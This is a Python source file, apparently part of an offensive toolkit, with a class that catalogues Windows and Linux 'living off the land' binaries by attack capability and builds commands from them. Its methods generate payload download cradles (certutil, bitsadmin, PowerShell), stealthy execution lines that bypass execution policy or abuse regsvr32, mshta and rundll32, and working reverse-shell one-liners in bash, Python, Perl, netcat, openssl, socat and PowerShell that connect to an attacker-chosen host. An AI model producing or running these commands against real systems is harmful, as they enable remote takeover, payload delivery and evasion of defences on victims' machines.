class LOLBinManager:
    LOLBINS_WINDOWS = {
        "powershell": {
            "path": "powershell.exe",
            "capabilities": ["execute", "download", "encode", "bypass", "amsi"],
            "description": "Full scripting, execution, and reflection capabilities",
        },
        "pwsh": {
            "path": "pwsh.exe",
            "capabilities": ["execute", "download", "encode", "bypass", "amsi"],
            "description": "PowerShell Core — cross-platform scripting",
        },
        "cscript": {
            "path": "cscript.exe",
            "capabilities": ["execute", "bypass"],
            "description": "Windows Script Host — VBScript/JS execution",
        },
        "wscript": {
            "path": "wscript.exe",
            "capabilities": ["execute", "bypass"],
            "description": "Windows Script Host — GUI script execution",
        },
        "mshta": {
            "path": "mshta.exe",
            "capabilities": ["execute", "download", "bypass"],
            "description": "Executes HTA applications — can run JavaScript/VBScript",
        },
        "certutil": {
            "path": "certutil.exe",
            "capabilities": ["download", "encode", "decode"],
            "description": "Certificate utility — can download and base64 decode files",
        },
        "bitsadmin": {
            "path": "bitsadmin.exe",
            "capabilities": ["download", "upload"],
            "description": "Background Intelligent Transfer — file download/upload",
        },
        "curl": {
            "path": "curl.exe",
            "capabilities": ["download", "upload"],
            "description": "Native HTTP client (Windows 10+ built-in)",
        },
        "wget": {
            "path": "wget.exe",
            "capabilities": ["download"],
            "description": "HTTP download tool (available in some builds)",
        },
        "regsvr32": {
            "path": "regsvr32.exe",
            "capabilities": ["execute", "bypass"],
            "description": "Register DLLs — can execute scriptlet files remotely",
        },
        "rundll32": {
            "path": "rundll32.exe",
            "capabilities": ["execute", "bypass"],
            "description": "Execute DLL exports — commonly used for JavaScript execution",
        },
        "msiexec": {
            "path": "msiexec.exe",
            "capabilities": ["execute", "download"],
            "description": "Windows Installer — can execute MSI files from URL",
        },
        "wmic": {
            "path": "wmic.exe",
            "capabilities": ["execute", "bypass"],
            "description": "WMI command-line — can execute XSL scripts",
        },
        "cmstp": {
            "path": "cmstp.exe",
            "capabilities": ["execute", "bypass"],
            "description": "Connection Manager profile installer — can execute DLLs",
        },
        "pcalua": {
            "path": "pcalua.exe",
            "capabilities": ["execute"],
            "description": "Program Compatibility Assistant — execute arbitrary binaries",
        },
        "hh": {
            "path": "hh.exe",
            "capabilities": ["execute"],
            "description": "HTML Help — execute CHM files with embedded scripts",
        },
        "iexplore": {
            "path": "iexplore.exe",
            "capabilities": ["download", "execute"],
            "description": "Internet Explorer — render HTML with scripting",
        },
        "msbuild": {
            "path": "msbuild.exe",
            "capabilities": ["execute", "bypass"],
            "description": "MS Build — execute C# code from XML project files",
        },
        "installutil": {
            "path": "installutil.exe",
            "capabilities": ["execute"],
            "description": ".NET installer — execute signed assemblies",
        },
        "csc": {
            "path": "csc.exe",
            "capabilities": ["execute"],
            "description": "C# compiler — compile and execute from source",
        },
        "jscript": {
            "path": "jscript.dll",
            "capabilities": ["execute"],
            "description": "JScript engine — via rundll32 or regsvr32",
        },
        "control": {
            "path": "control.exe",
            "capabilities": ["execute"],
            "description": "Control Panel — can load arbitrary DLLs",
        },
        "scriptrunner": {
            "path": "scriptrunner.exe",
            "capabilities": ["execute"],
            "description": "App-V Script Runner — execute PowerShell scripts",
        },
        "syncappvpublishingserver": {
            "path": "SyncAppvPublishingServer.exe",
            "capabilities": ["execute"],
            "description": "App-V publishing server — execute PowerShell scripts",
        },
        "wmiprvse": {
            "path": "WmiPrvSE.exe",
            "capabilities": ["execute"],
            "description": "WMI Provider Host — execute WMI queries and scripts",
        },
    }

    LOLBINS_LINUX = {
        "python": {
            "path": "/usr/bin/python3",
            "capabilities": ["execute", "reverse_shell", "encode"],
            "description": "Python interpreter — full scripting",
        },
        "perl": {
            "path": "/usr/bin/perl",
            "capabilities": ["execute", "reverse_shell", "encode"],
            "description": "Perl interpreter — full scripting",
        },
        "bash": {
            "path": "/bin/bash",
            "capabilities": ["execute", "reverse_shell", "download"],
            "description": "Bourne Again Shell — shell scripting",
        },
        "netcat": {
            "path": "/bin/nc",
            "capabilities": ["reverse_shell", "download", "port_scan"],
            "description": "Netcat — TCP/IP Swiss Army knife",
        },
        "curl": {
            "path": "/usr/bin/curl",
            "capabilities": ["download", "upload"],
            "description": "HTTP client with extensive protocol support",
        },
        "wget": {
            "path": "/usr/bin/wget",
            "capabilities": ["download"],
            "description": "HTTP/FTP download tool",
        },
        "openssl": {
            "path": "/usr/bin/openssl",
            "capabilities": ["reverse_shell", "encode", "download"],
            "description": "SSL/TLS toolkit — can create encrypted reverse shells",
        },
        "socat": {
            "path": "/usr/bin/socat",
            "capabilities": ["reverse_shell", "port_scan", "forward"],
            "description": "Multipurpose relay — port forwarding, reverse shell",
        },
        "nmap": {
            "path": "/usr/bin/nmap",
            "capabilities": ["port_scan", "script"],
            "description": "Network scanner with NSE scripting",
        },
        "gdb": {
            "path": "/usr/bin/gdb",
            "capabilities": ["execute"],
            "description": "GNU Debugger — can execute arbitrary commands",
        },
        "awk": {
            "path": "/usr/bin/awk",
            "capabilities": ["execute"],
            "description": "Text processor — can execute system commands",
        },
        "find": {
            "path": "/usr/bin/find",
            "capabilities": ["execute"],
            "description": "File search — can execute commands via -exec",
        },
        "git": {
            "path": "/usr/bin/git",
            "capabilities": ["download", "execute"],
            "description": "Version control — can clone repos and execute hooks",
        },
    }

    def __init__(self, platform="windows"):
        self.platform = platform
        self.db = self.LOLBINS_WINDOWS if platform == "windows" else self.LOLBINS_LINUX

    def set_platform(self, platform):
        self.platform = platform
        self.db = self.LOLBINS_WINDOWS if platform == "windows" else self.LOLBINS_LINUX

    def find_by_capability(self, capability):
        return [
            {"name": name, **info}
            for name, info in self.db.items()
            if capability in info["capabilities"]
        ]

    def find_by_name(self, name):
        return self.db.get(name.lower())

    def get_all(self):
        return [{"name": name, **info} for name, info in self.db.items()]

    def generate_download_cradle(self, bin_name, url, output=None):
        bin_name = bin_name.lower()
        if bin_name == "certutil":
            out = output or f"payload_{__import__('secrets').token_hex(4)}.exe"
            return f"certutil -urlcache -split -f {url} {out}"
        elif bin_name == "bitsadmin":
            out = output or f"payload_{__import__('secrets').token_hex(4)}.exe"
            return f"bitsadmin /transfer job_{__import__('secrets').token_hex(4)} /download /priority high {url} {out}"
        elif bin_name == "curl":
            out = output or "-O"
            return f"curl -s {url} {out}"
        elif bin_name == "wget":
            out = output or ""
            return f"wget {url} {out}"
        elif bin_name == "powershell":
            return f"powershell -c \"Invoke-WebRequest -Uri '{url}' -OutFile '{output or 'payload.exe'}'\""
        return f"# No download cradle for {bin_name}"

    def generate_execution(self, bin_name, payload_path, args=""):
        bin_name = bin_name.lower()
        info = self.db.get(bin_name)
        if not info:
            return f"# Unknown LOLBin: {bin_name}"
        path = info["path"]

        templates = {
            "powershell": f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File {payload_path} {args}",
            "pwsh": f"pwsh -ExecutionPolicy Bypass -File {payload_path} {args}",
            "mshta": f"mshta vbscript:CreateObject('WScript.Shell').Run('{payload_path}',0)(WindowClose)",
            "wmic": f"wmic os get /format:\"{payload_path}\"",
            "regsvr32": f"regsvr32 /s /u /i:\"{payload_path}\" scrobj.dll",
            "rundll32": f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";{payload_path}",
            "msbuild": f"msbuild {payload_path}",
            "cscript": f"cscript //nologo {payload_path} {args}",
            "msiexec": f"msiexec /quiet /i {payload_path}",
        }
        return templates.get(bin_name, f"{path} {payload_path} {args}").strip()

    def generate_reverse_shell(self, bin_name, lhost, lport):
        if self.platform == "linux":
            if bin_name == "bash":
                return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            elif bin_name == "python":
                return f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
            elif bin_name == "perl":
                return f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
            elif bin_name == "netcat":
                return f"nc -e /bin/sh {lhost} {lport}"
            elif bin_name == "openssl":
                return f"openssl s_client -quiet -connect {lhost}:{lport} | /bin/bash"
            elif bin_name == "socat":
                return f"socat exec:'/bin/bash',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
        else:
            if bin_name == "powershell":
                return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()\""
        return f"# No reverse shell template for {bin_name} on {self.platform}"

    def summarize(self):
        lines = [f"## LOLBins for {self.platform.upper()}"]
        lines.append(f"Total: {len(self.db)} binaries")
        for name, info in sorted(self.db.items()):
            caps = ", ".join(info["capabilities"])
            lines.append(f"- **{name}** ({info['path']}): {caps}")
        return "\n".join(lines)
